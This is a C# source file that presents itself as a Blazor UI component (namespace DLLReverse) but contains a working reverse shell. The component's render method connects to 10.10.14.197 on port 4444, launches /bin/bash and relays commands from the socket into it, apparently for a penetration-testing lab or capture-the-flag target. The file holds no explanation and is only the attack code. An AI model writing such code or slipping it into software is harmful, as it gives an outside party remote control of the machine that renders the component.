using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System;
using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Components;
using Microsoft.AspNetCore.Components.Rendering;
 
namespace DLLReverse {
    public class Component : ComponentBase {
        static StreamWriter? streamWriter;
 
        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine) {
            StringBuilder strOutput = new StringBuilder();
 
            if (!String.IsNullOrEmpty(outLine.Data)) {
                try {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                } catch (Exception err) { }
            }
        }
 
        protected override void BuildRenderTree(RenderTreeBuilder __builder) {
            using (TcpClient client = new TcpClient("10.10.14.197", 4444)) {
                using (Stream stream = client.GetStream()) {
                    using (StreamReader rdr = new StreamReader(stream)) {
                        streamWriter = new StreamWriter(stream);
 
                        StringBuilder strInput = new StringBuilder();
 
                        Process p = new Process();
                        p.StartInfo.FileName = "/bin/bash";
                        p.StartInfo.CreateNoWindow = true;
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardInput = true;
                        p.StartInfo.RedirectStandardError = true;
                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                        p.Start();
                        p.BeginOutputReadLine();
 
                        while (true) {
                            strInput.Append(rdr.ReadLine());
                            //strInput.Append("\n");
                            p.StandardInput.WriteLine(strInput);
                            strInput.Remove(0, strInput.Length);
                        }
                    }
                }
            }
        }
    }
 
    public class _Imports : ComponentBase {
        protected override void BuildRenderTree(RenderTreeBuilder __builder) {
        }
    }
 
}
